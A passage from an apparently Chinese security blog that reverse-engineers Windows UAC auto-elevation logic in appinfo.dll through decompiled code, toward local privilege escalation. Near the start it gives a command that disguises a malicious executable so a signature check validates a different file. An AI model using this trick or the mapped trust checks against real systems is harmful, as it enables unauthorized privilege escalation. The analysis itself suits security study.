class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p>WinObj中符号连结的顶层目录下有些常用子目录：</p>
<table>
<thead>
<tr>
<th>子目录</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Driver</td>
<td>已挂载驱动档案</td>
</tr>
<tr>
<td>Device</td>
<td>全域设备，如TCP&#x2F;UDP设备、NULL设备、UNC路径使用的Mup设备</td>
</tr>
<tr>
<td>GLOBAL??</td>
<td>全域符号连结，遇到前缀“\\.\”时使用</td>
</tr>
<tr>
<td>KnownDlls</td>
<td>已知DLL模组，不按照DLL搜索顺序进行搜索，避免DLL劫持</td>
</tr>
</tbody></table>
<p>在这个情况下，可以欺骗：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> 恶意.exe &gt; <span class="string">&quot;\\?\C:\tmp\正常.exe &quot;</span> <span class="comment">#注意最后这个空格</span></span><br></pre></td></tr></table></figure>

<p>对“正常.exe ”进行签名校验时实际抓的是“正常.exe”，此时签名通过。</p>
<h2 id="UAC防护逆向工程至本地提权"><a href="#UAC防护逆向工程至本地提权" class="headerlink" title="UAC防护逆向工程至本地提权"></a>UAC防护逆向工程至本地提权</h2><h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>UAC防护服务名为Application Information，可以看到命令行如下，意思是将appinfo.dll托管在svchost.exe高权限服务，独立为一个进行运作。当出现UAC授权的GUI界面时，用Process Explorer可以看到svchost.exe下出现了consent.exe，即UAC授权GUI界面。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\svchost.exe -k netsvcs -p</span><br></pre></td></tr></table></figure>

<p>每次低权程式档案撞见为特权提升进程时，且请求被允许时，UAC特权服务以高权孵化出低权程式档案进程。这代表UAC特权服务有回调函数<code>appinfo!RAiLaunchAdminProcess</code>负责接收请求、验证、生成进程和分放权限。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">APP_PROCESS_INFORMATION</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int3264 ProcessHandle;</span><br><span class="line">    <span class="type">unsigned</span> __int3264 ThreadHandle;</span><br><span class="line">    <span class="type">long</span> ProcessId;</span><br><span class="line">    <span class="type">long</span> ThreadId;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">RAiLaunchAdminProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">handle_t</span> hBinding, <span class="comment">//RPC通道句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in][unique][string] <span class="type">wchar_t</span>* ExecuteablePath, <span class="comment">//低权程式路径</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in][unique][string] <span class="type">wchar_t</span>* CommandLine, <span class="comment">//命令参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">long</span> StartFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">long</span> CreateFlags, <span class="comment">//CreateProcessAsUser的dwCreateFlags参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in][string] <span class="type">wchar_t</span>* CurrentDirectory, <span class="comment">//预设工作目录</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in][string] <span class="type">wchar_t</span>* WindowStation, <span class="comment">//若有视窗界面 应被配置于哪个工作站</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="keyword">struct</span> APP_STARTUP_INFO* StartupInfo, <span class="comment">//视窗起始坐标、大小、最大最小或隐藏介面</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">unsigned</span> __int3264 hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">long</span> Timout,</span></span></span><br><span class="line"><span class="params"><span class="function">    [out] <span class="keyword">struct</span> APP_PROCESS_INFORMATION* ProcessInformation, <span class="comment">//返回子进程信息 有进程线程识别码、控制码等</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [out] <span class="type">long</span>* ElevationType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在<code>RAiLaunchAdminProcess</code>中调用的<code>RAiLaunchProcessWithIdentity</code>中，有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v44 = <span class="built_in">I_RpcBindingInqLocalClientPID</span>(Binding, &amp;Pid); <span class="comment">//通过Binding取得发起此RPC请求的父进程的进程ID</span></span><br><span class="line"><span class="keyword">if</span> ( !v44 ) &#123;</span><br><span class="line">  ClientId.UniqueProcess = (HANDLE)Pid;</span><br><span class="line">  ObjectAttributes.Length = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;ObjectAttributes.RootDirectory, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">  *(_OWORD *)&amp;ObjectAttributes.SecurityDescriptor = <span class="number">0LL</span>;</span><br><span class="line">  v45 = <span class="built_in">NtOpenProcess</span>(&amp;ProcessHandle, <span class="number">0x1004C0</span>u, &amp;ObjectAttributes, &amp;ClientId); <span class="comment">//尝试读取父进程来确认是否存活 已死亡则无需后续认证流程与生成子进程</span></span><br><span class="line">  <span class="keyword">if</span> ( v45 &lt; <span class="number">0</span> )</span><br><span class="line">    v44 = <span class="built_in">RtlNtStatusToDosErrorNoTeb</span>(v45);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>在<code>RAiLaunchAdminProcess</code>中还有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hObject = <span class="built_in">CreateFileW</span>(v41, <span class="number">0xA0000000</span>, <span class="number">5u</span>, <span class="number">0LL</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0LL</span>); <span class="comment">//以可读可执行方式向内核请求子进程档案控制码</span></span><br><span class="line"><span class="keyword">if</span> ( hObject == (HANDLE)<span class="number">-1LL</span> ) &#123;</span><br><span class="line">  LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">  v16 = token;</span><br><span class="line">  Reply = LastError;</span><br><span class="line">  <span class="keyword">if</span> ( LastError != <span class="number">1920</span> &amp;&amp; LastError != <span class="number">5</span> || !(<span class="type">unsigned</span> __int8)<span class="built_in">IsLoadAppExecutionAliasInfoExPresent</span>() || (v99 = <span class="number">0</span>, AppExecutionAliasPath = <span class="built_in">GetAppExecutionAliasPath</span>(v41, v16, <span class="number">0LL</span>, &amp;v99), <span class="built_in">WIN32_FROM_HRESULT</span>(AppExecutionAliasPath) != <span class="number">122</span>) ) &#123;</span><br><span class="line">LABEL_105:</span><br></pre></td></tr></table></figure>

<p>还有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reply = <span class="built_in">CheckElevation</span>(v64, &amp;v120, <span class="number">0LL</span>, &amp;v107, &amp;v97); <span class="comment">//v107为1表示不要通知 2为应用程式尝试变更时通知 选项如控制面板中设置一样</span></span><br><span class="line"><span class="keyword">if</span> ( !Reply ) &#123;</span><br><span class="line">  v65 = v63;</span><br><span class="line">  <span class="keyword">if</span> ( v26 )</span><br><span class="line">    v65 = v26;</span><br><span class="line">  Reply = <span class="built_in">AiCheckSecureApplicationDirectory</span>(v65, &amp;v99);</span><br><span class="line">  <span class="keyword">if</span> ( Reply ) &#123;</span><br><span class="line">    <span class="built_in">RpcRevertToSelf</span>();</span><br></pre></td></tr></table></figure>

<p>Windows 7的UAC防护加入了“UAC信任授权双重认证机制”，若两段认证“认证A”和“认证B”皆通过，在consent.exe被唤起后不弹出UAC介面程式询问使用者是否授权，并自动同意该次提升进程创建请求。</p>
<p>认证A阶段时，函数<code>AiCheckSecureApplicationDirectory</code>中认证子进程路径是否从可信路径发起的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  *a2 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  UnicodeString = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;RelativeName, <span class="number">0</span>, <span class="built_in">sizeof</span>(RelativeName));</span><br><span class="line">  LongPathNameW = <span class="built_in">GetLongPathNameW</span>(lpszShortPath, <span class="number">0LL</span>, <span class="number">0</span>); <span class="comment">//计算该路径字串长度</span></span><br><span class="line">  v8 = LongPathNameW;</span><br><span class="line">  <span class="keyword">if</span> ( !LongPathNameW )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  v11 = (WCHAR *)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">2LL</span> * LongPathNameW); <span class="comment">//申请一块对应长度的wchar_t字串空间</span></span><br><span class="line">  v6 = v11;</span><br><span class="line">  <span class="keyword">if</span> ( !v11 ) &#123;</span><br><span class="line">    <span class="built_in">LocalFree</span>(<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">RtlReleaseRelativeName</span>(&amp;RelativeName);</span><br><span class="line">    v5 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">GetLongPathNameW</span>(lpszShortPath, v11, v8) ) &#123; <span class="comment">//将子进程路径储存入该字串空间</span></span><br><span class="line">LABEL_2:</span><br><span class="line">    LastError = <span class="built_in">GetLastError</span>();</span><br><span class="line">LABEL_3:</span><br><span class="line">    v5 = LastError;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = ((__int64 (__fastcall *)(WCHAR *, <span class="keyword">struct</span> _UNICODE_STRING *, _QWORD, _RTL_RELATIVE_NAME_U *))RtlDosPathNameToRelativeNtPathName_U_WithStatus)(v6,&amp;UnicodeString,<span class="number">0LL</span>,&amp;RelativeName); <span class="comment">//将长档名绝对路径转译为NT Path 后继路径比对都基于该转换结果 例如L&quot;C:\a.exe&quot;转为L&quot;\??\C:\a.exe&quot;</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 &lt; <span class="number">0</span> ) &#123;</span><br></pre></td></tr></table></figure>

<p>在接下来的这个函数中，比对路径开头是否符合白名单内的系统路径，如\??\C:\Windows、\??\C:\Program Files\或\??\C:\Program Files(x86)\且不在黑名单目录内，黑名单目录通常为小算盘、Windows Edge等系统额外特色小工具的目录。若从C:\Windows\开头的绝对路径发起，则trustedFlag设为0x2000。此外还以C:\Windows\System32、C:\Windows\SysWOW64、C:\Windows\ehome、C:\Windows\Adam或C:\Windows\ImmersizeControlPanel开头的，设为0x4000。后续<code>AipMatchesOriginalFileName</code>将程式做档案映射到记忆体中，确认其PE程式档案资源档中version.txt记录着编译时档案名称是否与当前子进程档名相符，来避免档案替换的劫持手段。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">AipCheckSecureWindowsDirectory</span><span class="params">(<span class="keyword">struct</span> _UNICODE_STRING *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">RtlPrefixUnicodeString</span>((PCUNICODE_STRING)&amp;g_ExcludedWinDir + v3, a1, <span class="number">1u</span>) )</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">0x20</span> ) &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">32</span> ) &#123;</span><br><span class="line">        *a2 |= <span class="number">0x2000</span>u; <span class="comment">//trustedFlag 第一层信任：可参考的信任但无法完全信任的值0x2000</span></span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( !<span class="built_in">RtlPrefixUnicodeString</span>((PCUNICODE_STRING)&amp;g_IncludedWinDir + v6, a1, <span class="number">1u</span>) )</span><br><span class="line">          <span class="keyword">if</span> ( ++v6 &gt;= <span class="number">5</span> ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v6 == <span class="number">5</span> &amp;&amp; <span class="built_in">wcschr</span>(&amp;a1-&gt;Buffer[(<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int16)word_180040FE8 &gt;&gt; <span class="number">1</span>], <span class="string">&#x27;\\&#x27;</span>) )</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        *a2 |= <span class="number">0x4000</span>u;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i )</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">RtlEqualUnicodeString</span>((PCUNICODE_STRING)&amp;g_IncludedXmtExe + i, a1, <span class="number">1u</span>) ) &#123;</span><br><span class="line">            v8 = <span class="built_in">AipMatchesOriginalFileName</span>(a1);</span><br><span class="line">            v9 = *a2;</span><br><span class="line">            <span class="keyword">if</span> ( v8 ) &#123;</span><br><span class="line">              *a2 = v9 | <span class="number">0x800000</span>; <span class="comment">//0x400000、0x800000或0x200000标志是通过后记第二层自动提升验证的重要标记</span></span><br><span class="line">LABEL_22: <span class="comment">//当位于System32和SysWow64时赋值0x200000</span></span><br><span class="line">              *a2 |= <span class="number">0x200000</span>u;</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            *a2 = v9 | <span class="number">0x400000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">if</span> ( i != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">        <span class="keyword">while</span> ( !<span class="built_in">RtlPrefixUnicodeString</span>((PCUNICODE_STRING)&amp;g_IncludedSysDir + v2, a1, <span class="number">1u</span>) )</span><br><span class="line">          <span class="keyword">if</span> ( ++v2 &gt;= <span class="number">2</span> ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v2 == <span class="number">2</span> )</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">wcschr</span>(&amp;a1-&gt;Buffer[(<span class="type">unsigned</span> __int64)*((<span class="type">unsigned</span> __int16 *)&amp;g_IncludedSysDir + <span class="number">8</span> * v2) &gt;&gt; <span class="number">1</span>], <span class="string">&#x27;\\&#x27;</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若程式路径开头在Program Files则进一步呼叫<code>AipCheckSecurePFDirectory</code>来比对目录是否在Windwos Defender、Journal、Media Player或Multipoint Server中。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">AipCheckSecurePFDirectory</span><span class="params">(PCUNICODE_STRING String2, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  *a2 |= <span class="number">0x2000</span>u;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">RtlPrefixUnicodeString</span>((PCUNICODE_STRING)&amp;g_IncludedPF + v3, String2, <span class="number">1u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">8</span> );</span><br><span class="line">  *a2 |= <span class="number">0x4000</span>u; <span class="comment">//若是则trustedFlag设为0x2000|0x4000 指隶属Windows的外部应用服务 即Program Files下的客制化安装程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>RAiLaunchAdminProcess</code>中有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">AiIsEXESafeToAutoApprove</span>(v66, hObject, v63, &amp;v99, &amp;v128);</span><br><span class="line">v67 = <span class="built_in">RpcRevertToSelf</span>();</span><br><span class="line">v15 = v99;</span><br><span class="line"><span class="keyword">if</span> ( v67 ) &#123;</span><br><span class="line">  Reply = v67;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_165;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (v120 &amp; <span class="number">8</span>) != <span class="number">0</span> ) &#123;</span><br><span class="line">  v15 = v99 | <span class="number">0x1000</span>;</span><br><span class="line">  v99 |= <span class="number">0x1000</span>u;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( (v120 &amp; <span class="number">4</span>) != <span class="number">0</span> ) &#123;</span><br><span class="line">  v15 |= <span class="number">2u</span>;</span><br><span class="line">  v99 = v15;</span><br></pre></td></tr></table></figure>

<p><code>AiIsEXESafeToAutoApprove</code>即为整体UAC提权自动提升的重点验证，如果之前验证A中trustedFlag未大于0x200000，则直接离开该函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (v13 &amp; <span class="number">0x200000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  v14 = WPP_GLOBAL_Control;</span><br><span class="line">  <span class="keyword">if</span> ( WPP_GLOBAL_Control == (_UNKNOWN *)&amp;WPP_GLOBAL_Control )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  <span class="keyword">if</span> ( (*((_BYTE *)WPP_GLOBAL_Control + <span class="number">28</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> ) &#123;</span><br><span class="line">    v31 = <span class="number">11LL</span>;</span><br><span class="line">LABEL_46:</span><br></pre></td></tr></table></figure>

<p>接下来：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">LABEL_6:</span><br><span class="line">    v16 = <span class="built_in">wcsrchr</span>(a1, <span class="string">&#x27;\\&#x27;</span>); <span class="comment">//拿出当前程式档案名称</span></span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      v17 = v16 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v17 = a1;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v40) = <span class="number">0</span>;</span><br><span class="line">    v41[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    pActCtx.lpResourceName = (LPCWSTR)<span class="number">1</span>;</span><br><span class="line">    pActCtx.cbSize = <span class="number">56</span>;</span><br><span class="line">    pActCtx.lpSource = a1;</span><br><span class="line">    pActCtx.dwFlags = <span class="number">8</span>;</span><br><span class="line">    *(_OWORD *)&amp;pActCtx.wProcessorArchitecture = <span class="number">0LL</span>;</span><br><span class="line">    *(_OWORD *)&amp;pActCtx.lpApplicationName = <span class="number">0LL</span>;</span><br><span class="line">    FileMappingW = <span class="built_in">CreateFileMappingW</span>(v7, <span class="number">0LL</span>, <span class="number">0x11000002</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0LL</span>); <span class="comment">//将子进程程式静态内容从磁碟槽上档案映射进来</span></span><br><span class="line">    <span class="keyword">if</span> ( FileMappingW ) &#123;</span><br><span class="line">      v19 = (HMODULE)<span class="built_in">MapViewOfFile</span>(FileMappingW, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">      v20 = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 ) &#123;</span><br><span class="line">        pActCtx.dwFlags |= <span class="number">0x80</span>u;</span><br><span class="line">        pActCtx.hModule = v19;</span><br><span class="line">        v47[<span class="number">1</span>] = <span class="number">1LL</span>;</span><br><span class="line">        v47[<span class="number">0</span>] = <span class="number">24LL</span>;</span><br><span class="line">        v47[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">        v41[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">int</span>)<span class="built_in">LdrResSearchResource</span>(v19, v47, <span class="number">3LL</span>) &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line">          v21 = <span class="built_in">CreateActCtxW</span>(&amp;pActCtx);</span><br><span class="line">          hActCtx = v21;</span><br><span class="line">          <span class="keyword">if</span> ( v21 != (HANDLE)<span class="number">-1LL</span>  )&#123;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">QueryActCtxSettingsW</span>(<span class="number">0</span>, v21, <span class="number">0LL</span>, <span class="string">L&quot;autoElevate&quot;</span>, pvBuffer, <span class="number">8uLL</span>, <span class="number">0LL</span>) ) &#123; <span class="comment">//确认静态程式内容中咨询清单manifest.xml是否将autoElevate键值设为true表示程式自身欲求Auto Elevation特权提升 没有则离开后继认证授权</span></span><br><span class="line">              v32 = (<span class="type">unsigned</span> __int8)v40;</span><br><span class="line">              <span class="keyword">if</span> ( ((pvBuffer[<span class="number">0</span>] - <span class="number">84</span>) &amp; <span class="number">0xFFDF</span>) == <span class="number">0</span> )</span><br><span class="line">                v32 = <span class="number">1</span>;</span><br><span class="line">              v40 = v32;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">ReleaseActCtx</span>(hActCtx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">bsearch</span>(v17, &amp;g_lpAutoApproveEXEList, <span class="number">0xA</span>uLL, <span class="number">8uLL</span>, AipCompareEXE) ) &#123; <span class="comment">//若子进程未有Auto Elevation请求 但档案名称为白名单清单中一项 则也被视为需要自动特权提升的程式</span></span><br><span class="line">LABEL_38:</span><br><span class="line">      v9 = <span class="string">L&quot;NULL&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">AipIsValidAutoApprovalEXE</span>(v7, a1) ) &#123; <span class="comment">//验证微软数位签章、且签章效力仍有效状态 则通过认证B</span></span><br><span class="line">      *a4 |= <span class="number">0x400000</span>u;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>AipIsValidAutoApprovalEXE</code>中有：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">AipIsValidAutoApprovalEXE</span><span class="params">(<span class="type">void</span> *a1, <span class="type">const</span> <span class="type">unsigned</span> __int16 *a2)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DestinationString; <span class="comment">// [rsp+30h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+40h] [rbp-68h] BYREF</span></span><br><span class="line">  _DWORD v8[<span class="number">23</span>]; <span class="comment">// [rsp+44h] [rbp-64h] BYREF</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset_0</span>(v8, <span class="number">0</span>, <span class="number">0x54</span>uLL);</span><br><span class="line">  v7 = <span class="number">88</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)<span class="built_in">WTGetSignatureInfo</span>(a2, a1, <span class="number">6146LL</span>, &amp;v7, <span class="number">0LL</span>, <span class="number">0LL</span>) &gt;= 